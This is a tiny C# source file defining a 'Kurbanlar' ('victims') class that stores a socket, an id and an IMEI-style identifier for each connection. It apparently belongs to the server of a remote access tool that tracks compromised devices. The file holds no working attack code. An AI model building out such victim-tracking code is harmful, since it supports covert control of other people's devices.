using System.Net.Sockets;
namespace SV
{
    public class Kurbanlar
    {
        public Socket soket;
        public string id;
        public string identify;
        public string ping = default;
        public Kurbanlar(Socket s, string ident, string id_imei)
        {
            identify = id_imei;
            soket = s;
            id = ident;
        }
    }
}
